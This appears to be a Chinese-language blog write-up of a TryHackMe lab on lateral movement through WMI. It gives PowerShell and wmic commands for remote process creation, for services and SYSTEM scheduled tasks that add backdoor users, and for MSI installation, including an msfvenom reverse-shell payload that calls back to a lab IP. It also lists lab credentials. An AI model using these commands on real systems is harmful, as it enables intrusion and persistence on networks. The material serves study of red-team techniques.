---
title: "横向移动-WMI"
date: "2024-09-10"
description: "WMI是基于 Web 的企业管理 (WBEM) 的 Windows 实现，WBEM 是跨设备访问管理信息的企业标准。WBEM（Web-Based Enterprise Management）是一个开放标准，用于跨平台和跨设备的管理信息访问。WMI（Windows Management Instrum"
---

#### [](#什么是WMI "什么是WMI?")什么是WMI?

WMI是基于 Web 的企业管理 (WBEM) 的 Windows 实现，WBEM 是跨设备访问管理信息的企业标准。  
WBEM（Web-Based Enterprise Management）是一个开放标准，用于跨平台和跨设备的管理信息访问。WMI（Windows Management Instrumentation）是WBEM的Windows实现，它将WBEM标准应用于Windows环境，以提供系统管理和自动化功能。WMI在Windows系统中提供了一组用于查询和操作管理信息的接口和工具。

\*\*\*连接到WMI

连接到 WMI（Windows Management Instrumentation）之后，你可以管理和查询对应的系统。WMI 是 Windows 操作系统的一个组件，它允许你访问和操作系统的管理数据和功能。

通过 WMI，你可以执行各种操作，例如：

*   **查询系统信息**：获取系统硬件、操作系统、网络配置等信息。
*   **管理系统资源**：创建、删除、或修改文件和进程，管理服务等。
*   **执行系统操作**：启动、停止、重启服务或进程，设置系统属性等。

所以如同我们连接所有的系统一样我们都需要凭据，同时WMI还需要指定一个连接的方式。  
\*\*准备凭据

_一个很重要的点，我们连接wmi一定要是管理员_

```powershell
$username = 'Administrator';$password = 'Mypass123';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

稍微解释一下

1.  `$username` 和 `$password` 分别存储用户名和密码。
2.  `ConvertTo-SecureString` 将密码字符串转换为安全字符串对象，确保密码以加密方式存储。
3.  `New-Object System.Management.Automation.PSCredential` 创建一个 `PSCredential` 对象，结合用户名和安全字符串密码，用于进行需要身份验证的操作

## [](#连接方式 "**连接方式")\*\*连接方式

```
**DCOM：** RPC over IP 将用于连接到 WMI。该协议使用端口 135/ TCP和端口 49152-65535/ TCP ，正如使用 sc.exe 时所解释的那样。
```

\-  
**Wsman：** WinRM 将用于连接到 WMI。此协议使用端口 5985/TCP (WinRM HTTP ) 或 5986/ TCP (WinRM HTTPS)。

\*\*\*开始连接

```powershell
$Opt = New-CimSessionOption -Protocol DCOM$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

1.  **`$Opt = New-CimSessionOption -Protocol DCOM`**：创建一个 CIM 会话选项对象，指定协议为 DCOM（Distributed Component Object Model）。DCOM 是一种用于网络上的对象通信的协议。
    
2.  **`$Session = New-CimSession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop`**：建立一个新的 CIM 会话。参数包括：
    
    *   `-ComputerName TARGET`：指定目标计算机的名称或 IP 地址。
    *   `-Credential $credential`：传递之前创建的凭据对象，以便进行认证。
    *   `-SessionOption $Opt`：应用前面创建的会话选项（即 DCOM 协议）。
    *   `-ErrorAction Stop`：在发生错误时立即停止执行并抛出异常。

其实到这里，已经发现其实wmi是wbem的实现，那么他就是一个windows的组件，我们可以连接到远程计算机上的wmi然后开始使用wmi进行一个针对于系统的管理。

### [](#WMI的一些利用 "WMI的一些利用")WMI的一些利用

##### [](#执行系统命令 "执行系统命令")执行系统命令

我们可以利用 Windows Management Instrumentation ( WMI ) 从 Powershell 远程生成一个进程，向 Win32\_Process 类发送WMI请求，以在我们之前创建的会话下生成该进程

```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```

可以看到现在才发现，wmi没有一个交互我们的session就是我们连接之后的标志。把session带入到一个执行命令的powershell命令中。在以前的旧系统中可以使用wmic在命令行中直接连接wmi。  
`wmic` 确实被视为较旧的工具，主要因为它在 Windows 10 和 Windows Server 2019 及更高版本中逐渐被 PowerShell 替代。PowerShell 提供了更强大和灵活的功能，且与现代 Windows 系统更兼容。`wmic` 工具可能在未来的 Windows 版本中被逐步淘汰，因此推荐使用 PowerShell 的 `CimCmdlets` 或 `Get-WmiObject` 等命令进行类似的操作。

```cmd
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
```

##### [](#创建服务 "创建服务")创建服务

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName # 利用我们的连接sessionCreate -Arguments @{Name = "THMService2";# 创建一个THMService2的服务DisplayName = "THMService2";PathName = "net user munra2 Pass123 /add"; # payloadServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new processStartMode = "Manual"}
```

可以启动对应

```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"Invoke-CimMethod -InputObject $Service -MethodName StartService
```

删除服务

```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopServiceInvoke-CimMethod -InputObject $Service -MethodName Delete
```

##### [](#创建计划任务 "创建计划任务")创建计划任务

```powershell
# Payload must be split in Command and Args$Command = "cmd.exe"$Arg1 = "/c net user munra22 aSdf1234 /add"$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Arg1Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

\*\*\*删除定时任务

```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

##### [](#安装msi程序 "安装msi程序")安装msi程序

MSI 是  
一种用于安装程序的文件格式。如果我们可以将 MSI 包复制到目标系统，那么我们就可以使用 WMI 尝试为我们安装它。攻击者可以通过任何可用的方式复制该文件。一旦 MSI 文件位于目标系统中，我们就可以尝试通过WMI调用 Win32\_Product 类来安装

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

同样在旧系统

```cmd
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

### [](#稍微总结 "稍微总结")稍微总结

可以看到我们使用了windows的一个组件叫做WMI但其实我发现他更多的可能是简便了一些我们横向时候的操作，不需要重复的进行凭证验证。同时我们使用wmi可能更加的隐蔽。正如我们进行红队测试时候我们更多的是进行一些隐蔽的思量和思考。

### [](#实验 "实验")实验

\*\*\*首先需要一个管理员的凭据

**用户：** ZA.TRYHACKME.COM\\t1\_corine.waters  
**密码：** Korine.1994

具体的环境搭建不做赘述。

_先连接到对应的thmjmp2上_  
相关凭据: Username: henry.bird Password: Changeme123

具体实验步骤不做具体的描述，我们只尝试几个payload，和几种移动利用的方式。

##### [](#先连接WMI "先连接WMI")先连接WMI

```powershell
$username = 'ZA.TRYHACKME.COM\t1_corine.waters';#做好凭据生成$password = 'Korine.1994';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;# 做一个连接协议的 判定和选择  并且得到对应的会话$Opt = New-CimSessionOption -Protocol DCOM$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

在cmd中写一个ps1脚本，直接批量执行

_验证连接:_

###### [](#1-使用-wmic-命令 "1. 使用 wmic 命令")1\. 使用 `wmic` 命令

打开命令提示符（cmd）并输入以下命令：

`wmic os get caption`  
如果你能看到 Windows 操作系统的名称和版本，这表明你已成功连接到 WMI。

###### [](#2-使用-PowerShell "2. 使用 PowerShell")2\. 使用 PowerShell

打开 PowerShell 并输入以下命令：

`Get-WmiObject -Class Win32_OperatingSystem`

#### [](#计划任务 "计划任务")计划任务

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240910195837.png)

其实就是连接上wmi之后可以看到一个相应的session 可以看到，直接利用session进行系统相关的管理。此时我们可以测试一下，我们创建的用户登录对应thmiis系统。  
具体脚本\[\[#创建计划任务\]\]  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240910200936.png)  
可以看到我们的计划任务成功执行。 已经成功登录对应的thmiis系统。

#### [](#安装msi "安装msi")安装msi

我刚才仔细地考虑了一下，如果说是为了隐蔽的话。使用wmi进行一些系统管理，并且利用msi安装程序更隐蔽。

```shell
msfvenom -p windows/shell/reverse_tcp -f msi LHOST=10.50.148.56 LPORT=4444 -o k1t0service.msi
```

需要把msi先传递上去。

```shell
smbclient -c 'put k1t0service.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```

可以看到，我们之前已经连接到了wmi 的 session ,具体的监听不做赘述。  
此时就直接可以调用session,直接开始安装对应的msi程序。\[\[WMI#安装msi程序\]\]
